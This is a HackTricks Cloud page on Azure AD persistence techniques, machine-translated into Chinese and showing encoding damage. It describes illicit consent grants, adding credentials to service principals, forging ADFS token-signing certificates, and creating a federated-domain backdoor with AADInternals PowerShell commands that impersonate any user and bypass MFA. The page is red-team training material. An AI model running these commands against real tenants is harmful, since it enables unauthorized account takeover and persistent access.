# Az - æŒä¹…æ€§

{% hint style="success" %}
å­¦ä¹ å¹¶ç»ƒä¹ AWS Hackingï¼š<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
å­¦ä¹ å¹¶ç»ƒä¹ GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æ£€æŸ¥[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚**

</details>
{% endhint %}

### éæ³•åŒæ„æˆäºˆ

é»˜è®¤æƒ…å†µä¸‹ï¼Œä»»ä½•ç”¨æˆ·éƒ½å¯ä»¥åœ¨ Azure AD ä¸­æ³¨å†Œåº”ç”¨ç¨‹åºã€‚å› æ­¤ï¼Œæ‚¨å¯ä»¥æ³¨å†Œä¸€ä¸ªåº”ç”¨ç¨‹åºï¼ˆä»…é€‚ç”¨äºç›®æ ‡ç§Ÿæˆ·ï¼‰ï¼Œè¯¥åº”ç”¨ç¨‹åºéœ€è¦ç®¡ç†å‘˜åŒæ„çš„é«˜å½±å“æƒé™ï¼ˆå¦‚æœæ‚¨æ˜¯ç®¡ç†å‘˜ï¼Œåˆ™å¯ä»¥æ‰¹å‡†å®ƒï¼‰- æ¯”å¦‚ä»£è¡¨ç”¨æˆ·å‘é€é‚®ä»¶ã€è§’è‰²ç®¡ç†ç­‰ã€‚è¿™å°†ä½¿æˆ‘ä»¬èƒ½å¤Ÿåœ¨æˆåŠŸçš„æƒ…å†µä¸‹æ‰§è¡Œ**é’“é±¼æ”»å‡»**ï¼Œè¿™å°†æ˜¯éå¸¸**æœ‰æˆæ•ˆ**çš„ã€‚

æ­¤å¤–ï¼Œæ‚¨è¿˜å¯ä»¥æ¥å—è¯¥åº”ç”¨ç¨‹åºï¼Œå¹¶ä»¥æ‚¨çš„ç”¨æˆ·èº«ä»½æ¥ç»´æŒå¯¹å…¶çš„è®¿é—®ã€‚

### åº”ç”¨ç¨‹åºå’ŒæœåŠ¡ä¸»ä½“

å…·æœ‰åº”ç”¨ç¨‹åºç®¡ç†å‘˜ã€GA æˆ–å…·æœ‰ microsoft.directory/applications/credentials/update æƒé™çš„è‡ªå®šä¹‰è§’è‰²çš„ç‰¹æƒï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°æœ‰åº”ç”¨ç¨‹åºæ·»åŠ å‡­æ®ï¼ˆå¯†é’¥æˆ–è¯ä¹¦ï¼‰ã€‚

å¯ä»¥**é’ˆå¯¹å…·æœ‰é«˜æƒé™çš„åº”ç”¨ç¨‹åº**æˆ–**æ·»åŠ ä¸€ä¸ªå…·æœ‰é«˜æƒé™çš„æ–°åº”ç”¨ç¨‹åº**ã€‚

ä¸€ä¸ªæœ‰è¶£çš„è§’è‰²æ˜¯**ç‰¹æƒèº«ä»½éªŒè¯ç®¡ç†å‘˜è§’è‰²**ï¼Œå› ä¸ºå®ƒå…è®¸**é‡ç½®å…¨å±€ç®¡ç†å‘˜çš„å¯†ç **ã€‚

æ­¤æŠ€æœ¯è¿˜å…è®¸**ç»•è¿‡ MFA**ã€‚

{% code overflow="wrap" %}
```powershell
$passwd = ConvertTo-SecureString "J~Q~QMt_qe4uDzg53MDD_jrj_Q3P.changed" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential("311bf843-cc8b-459c-be24-6ed908458623", $passwd)
Connect-AzAccount -ServicePrincipal -Credential $credentials -Tenant e12984235-1035-452e-bd32-ab4d72639a
```
{% endcode %}

* ç”¨äºåŸºäºè¯ä¹¦çš„èº«ä»½éªŒè¯

{% code overflow="wrap" %}
```powershell
Connect-AzAccount -ServicePrincipal -Tenant <TenantId> -CertificateThumbprint <Thumbprint> -ApplicationId <ApplicationId>
```
{% endcode %}

### è”åˆ - ä»¤ç‰Œç­¾åè¯ä¹¦

æ‹¥æœ‰æœ¬åœ° AD ä¸Šçš„ **DA ç‰¹æƒ**ï¼Œå¯ä»¥åˆ›å»ºå’Œå¯¼å…¥å…·æœ‰éå¸¸é•¿æœ‰æ•ˆæœŸçš„ **æ–°ä»¤ç‰Œç­¾å** å’Œ **ä»¤ç‰Œè§£å¯†è¯ä¹¦**ã€‚è¿™å°†å…è®¸æˆ‘ä»¬ä»¥ä»»ä½•æˆ‘ä»¬çŸ¥é“å…¶ ImuutableID çš„ç”¨æˆ·èº«ä»½ **ç™»å½•**ã€‚

ä½œä¸º **ADFS æœåŠ¡å™¨ä¸Šçš„ DA** è¿è¡Œä»¥ä¸‹å‘½ä»¤æ¥åˆ›å»ºæ–°è¯ä¹¦ï¼ˆé»˜è®¤å¯†ç ä¸º 'AADInternals'ï¼‰ï¼Œå°†å®ƒä»¬æ·»åŠ åˆ° ADFSï¼Œç¦ç”¨è‡ªåŠ¨ç¿»è½¬å¹¶é‡æ–°å¯åŠ¨æœåŠ¡ï¼š
```powershell
New-AADIntADFSSelfSignedCertificates
```
ç„¶åï¼Œä½¿ç”¨Azure ADæ›´æ–°è¯ä¹¦ä¿¡æ¯ï¼š
```powershell
Update-AADIntADFSFederationSettings -Domain cyberranges.io
```
### è”é‚¦ - å—ä¿¡ä»»åŸŸ

æ‹¥æœ‰ç§Ÿæˆ·ä¸Šçš„ GA ç‰¹æƒåï¼Œå¯ä»¥**æ·»åŠ ä¸€ä¸ªæ–°åŸŸ**ï¼ˆå¿…é¡»ç»è¿‡éªŒè¯ï¼‰ï¼Œå°†å…¶èº«ä»½éªŒè¯ç±»å‹é…ç½®ä¸ºè”åˆï¼Œå¹¶é…ç½®è¯¥åŸŸ**ä¿¡ä»»ç‰¹å®šè¯ä¹¦**ï¼ˆåœ¨ä¸‹é¢çš„å‘½ä»¤ä¸­ä¸º any.stsï¼‰å’Œå‘è¡Œè€…ï¼š
```powershell
# Using AADInternals
ConvertTo-AADIntBackdoor -DomainName cyberranges.io

# Get ImmutableID of the user that we want to impersonate. Using Msol module
Get-MsolUser | select userPrincipalName,ImmutableID

# Access any cloud app as the user
Open-AADIntOffice365Portal -ImmutableID qIMPTm2Q3kimHgg4KQyveA== -Issuer "http://any.sts/B231A11F" -UseBuiltInCertificate -ByPassMFA$true
```
## å‚è€ƒèµ„æ–™

* [https://aadinternalsbackdoor.azurewebsites.net/](https://aadinternalsbackdoor.azurewebsites.net/)

{% hint style="success" %}
å­¦ä¹ å’Œå®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
å­¦ä¹ å’Œå®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æ£€æŸ¥ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* é€šè¿‡å‘ [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}
